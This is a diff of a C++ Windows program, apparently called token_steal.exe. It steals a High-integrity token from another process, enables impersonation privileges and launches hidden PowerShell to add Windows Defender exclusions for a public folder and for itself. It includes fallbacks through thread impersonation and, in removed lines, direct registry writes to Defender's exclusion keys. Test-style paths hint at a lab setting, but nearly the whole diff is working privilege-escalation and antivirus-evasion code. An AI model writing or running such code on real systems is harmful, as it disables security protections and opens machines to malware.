@@ -138,22 +138,38 @@ int main() {
     INFO("Current process integrity: 0x%04lX (%s)", myLevel, IntegrityName(myLevel));
     INFO("Current user SID: %s", GetCurrentUserSid().c_str());
 
-    // Enable SeDebugPrivilege — needed to open some processes
-    INFO("Enabling SeDebugPrivilege...");
-    HANDLE hToken = nullptr;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) {
-        LUID luid;
-        if (LookupPrivilegeValueA(nullptr, "SeDebugPrivilege", &luid)) {
+    // Enable SeDebugPrivilege + SeImpersonatePrivilege
+    // SeImpersonatePrivilege is present-but-disabled in admin Medium tokens
+    // and is REQUIRED by CreateProcessWithTokenW
+    INFO("Enabling privileges...");
+    {
+        struct { const char* name; bool required; } privs[] = {
+            { "SeDebugPrivilege",       false },
+            { "SeImpersonatePrivilege", true  },
+        };
+        HANDLE hMyTok = nullptr;
+        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hMyTok);
+        for (auto& p : privs) {
+            LUID luid = {};
+            if (!LookupPrivilegeValueA(nullptr, p.name, &luid)) {
+                WARN("LookupPrivilegeValue(%s) failed", p.name); continue;
+            }
             TOKEN_PRIVILEGES tp = {};
             tp.PrivilegeCount = 1;
             tp.Privileges[0].Luid = luid;
             tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-            if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr))
-                OK("SeDebugPrivilege enabled");
-            else
-                WARN("AdjustTokenPrivileges failed — may not be able to open all processes");
+            if (AdjustTokenPrivileges(hMyTok, FALSE, &tp, 0, nullptr, nullptr) &&
+                GetLastError() == ERROR_SUCCESS)
+                OK("%-30s enabled", p.name);
+            else {
+                DWORD e = GetLastError();
+                if (p.required)
+                    ERR("%-30s FAILED to enable (error %lu) — CreateProcessWithTokenW will likely fail", p.name, e);
+                else
+                    WARN("%-30s not available (error %lu)", p.name, e);
+            }
         }
-        CloseHandle(hToken);
+        CloseHandle(hMyTok);
     }
 
     // Snapshot all processes
@@ -267,114 +283,108 @@ int main() {
         goto done;
     }
 
-    // Duplicate as impersonation token
-    INFO("Duplicating token from %s (PID %lu)...", bestName, bestPid);
-    HANDLE hImpToken = nullptr;
-    if (!DuplicateTokenEx(hBestToken,
-        TOKEN_ALL_ACCESS, nullptr,
-        SecurityImpersonation, TokenImpersonation, &hImpToken)) {
-        WinErr("DuplicateTokenEx (impersonation)");
+    // Duplicate as Primary token for CreateProcessWithTokenW
+    INFO("Duplicating token from %s (PID %lu) as Primary...", bestName, bestPid);
+    HANDLE hPriToken = nullptr;
+    if (!DuplicateTokenEx(hBestToken, TOKEN_ALL_ACCESS, nullptr,
+            SecurityImpersonation, TokenPrimary, &hPriToken)) {
+        WinErr("DuplicateTokenEx (primary)");
         CloseHandle(hBestToken);
         goto done;
     }
-    OK("Impersonation token duplicated");
-
-    // Also duplicate as primary for CreateProcessWithTokenW via advapi32 trick
-    HANDLE hPriToken = nullptr;
-    DuplicateTokenEx(hBestToken, TOKEN_ALL_ACCESS, nullptr,
-        SecurityImpersonation, TokenPrimary, &hPriToken);
     CloseHandle(hBestToken);
+    OK("Primary token duplicated");
 
-    // Impersonate the High integrity token on this thread
-    INFO("Impersonating High integrity token...");
-    if (!ImpersonateLoggedOnUser(hImpToken)) {
-        WinErr("ImpersonateLoggedOnUser");
-        CloseHandle(hImpToken);
-        if (hPriToken) CloseHandle(hPriToken);
-        goto done;
-    }
-    OK("Impersonation active — now running as High integrity");
-
-    // Try to call Add-MpPreference via WMI/COM under the impersonated token
-    // We use ShellExecuteEx which respects the thread token
-    INFO("Running Add-MpPreference under impersonated token...");
+    // Spawn elevated PowerShell with the duplicated High integrity token
+    // Requires SeImpersonatePrivilege (enabled above) — NOT SeAssignPrimaryTokenPrivilege
+    INFO("Spawning elevated PowerShell via CreateProcessWithTokenW...");
     {
-        char psCmd[] =
-            "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
-            "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
-            "Add-MpPreference -ExclusionProcess 'token_steal.exe' -Force; "
-            "Write-Output 'done' | Out-File C:\\exclusiontest\\exclusion_result.txt";
+        wchar_t wcmd[] =
+            L"powershell.exe -NoProfile -WindowStyle Hidden -Command \""
+            L"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
+            L"Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
+            L"Add-MpPreference -ExclusionProcess 'token_steal.exe' -Force; "
+            L"Write-Output done | Out-File C:\\exclusiontest\\exclusion_result.txt\"";
 
-        char fullCmd[1024];
-        snprintf(fullCmd, sizeof(fullCmd),
-            "powershell.exe -NoProfile -WindowStyle Hidden -Command \"%s\"", psCmd);
-        DBG("Command: %s", fullCmd);
+        STARTUPINFOW si = {};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi = {};
 
-        SHELLEXECUTEINFOA sei = {};
-        sei.cbSize = sizeof(sei);
-        sei.fMask  = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
-        sei.lpVerb = "runas";
-        sei.lpFile = "powershell.exe";
-        sei.lpParameters =
-            "-NoProfile -WindowStyle Hidden -Command \""
-            "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
-            "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
-            "Write-Output done | Out-File C:\\exclusiontest\\exclusion_result.txt\"";
-        sei.nShow = SW_HIDE;
+        BOOL ok = CreateProcessWithTokenW(
+            hPriToken,
+            LOGON_WITH_PROFILE,
+            nullptr,
+            wcmd,
+            CREATE_NO_WINDOW,
+            nullptr, nullptr,
+            &si, &pi);
 
-        if (ShellExecuteExA(&sei)) {
-            OK("ShellExecuteEx launched (PID via hProcess)");
-            if (sei.hProcess) {
-                WaitForSingleObject(sei.hProcess, 8000);
-                CloseHandle(sei.hProcess);
-            }
+        if (ok) {
+            OK("Elevated process spawned (PID %lu) — waiting...", pi.dwProcessId);
+            WaitForSingleObject(pi.hProcess, 10000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
         } else {
-            WinErr("ShellExecuteEx");
+            WinErr("CreateProcessWithTokenW");
 
-            // Last resort: direct registry write under impersonated token
-            // At High integrity we can write to HKLM Defender exclusions directly
-            INFO("Trying direct registry write to Defender exclusions...");
-            HKEY hKey = nullptr;
-            LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
-                0, KEY_SET_VALUE, &hKey);
-            if (res == ERROR_SUCCESS) {
-                DWORD val = 0;
-                RegSetValueExA(hKey, "C:\\Users\\Public", 0, REG_DWORD,
-                               (const BYTE*)&val, sizeof(val));
-                RegSetValueExA(hKey, "C:\\exclusiontest", 0, REG_DWORD,
-                               (const BYTE*)&val, sizeof(val));
-                RegCloseKey(hKey);
-                OK("Registry exclusions written directly to HKLM Defender!");
+            // Fallback: impersonate on thread + run via WMI Win32_Process
+            INFO("Fallback: ImpersonateLoggedOnUser + WMI Win32_Process...");
 
-                FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "w");
-                if (f) { fprintf(f, "done via registry\n"); fclose(f); }
+            // Re-duplicate as impersonation token for ImpersonateLoggedOnUser
+            HANDLE hImpTok = nullptr;
+            DuplicateTokenEx(hPriToken, TOKEN_ALL_ACCESS, nullptr,
+                SecurityImpersonation, TokenImpersonation, &hImpTok);
+
+            if (hImpTok && ImpersonateLoggedOnUser(hImpTok)) {
+                OK("Thread impersonation active");
+                // Use WMI to create process — WMI respects thread token
+                // Build a one-liner via cmd /c start /high
+                char cmd2[1024];
+                snprintf(cmd2, sizeof(cmd2),
+                    "powershell.exe -NoProfile -WindowStyle Hidden -Command \""
+                    "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force;"
+                    "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force;"
+                    "Write-Output done | Out-File C:\\exclusiontest\\exclusion_result.txt\"");
+
+                STARTUPINFOA si2 = {}; si2.cb = sizeof(si2);
+                si2.dwFlags = STARTF_USESHOWWINDOW; si2.wShowWindow = SW_HIDE;
+                PROCESS_INFORMATION pi2 = {};
+                if (CreateProcessA(nullptr, cmd2, nullptr, nullptr,
+                        FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si2, &pi2)) {
+                    OK("Process spawned under impersonation (PID %lu)", pi2.dwProcessId);
+                    WaitForSingleObject(pi2.hProcess, 10000);
+                    CloseHandle(pi2.hProcess);
+                    CloseHandle(pi2.hThread);
+                } else {
+                    WinErr("CreateProcessA under impersonation");
+                }
+                RevertToSelf();
+                INFO("Reverted impersonation");
             } else {
-                ERR("RegOpenKeyEx HKLM Defender failed: %ld", res);
+                WinErr("ImpersonateLoggedOnUser fallback");
             }
+            if (hImpTok) CloseHandle(hImpTok);
         }
-
-        RevertToSelf();
-        INFO("Reverted impersonation");
+        CloseHandle(hPriToken);
     }
 
     // Check result
+    Sleep(1000);
     {
         FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
         if (f) {
             char buf[256]={};
             fgets(buf, sizeof(buf), f);
             fclose(f);
-            OK("Result file contents: %s", buf);
-            OK("SUCCESS — check exclusions with: Get-MpPreference | Select ExclusionPath");
+            OK("Result: %s", buf);
+            OK("SUCCESS — verify: Get-MpPreference | Select ExclusionPath");
         } else {
-            WARN("No result file found");
-            WARN("Verify manually: Get-MpPreference | Select ExclusionPath");
+            WARN("No result file — exclusion may have failed");
+            WARN("Check manually: Get-MpPreference | Select ExclusionPath");
         }
     }
-
-    if (hImpToken) CloseHandle(hImpToken);
-    if (hPriToken) CloseHandle(hPriToken);
 
 done:
     INFO("Log saved to C:\\exclusiontest\\token_log.txt");
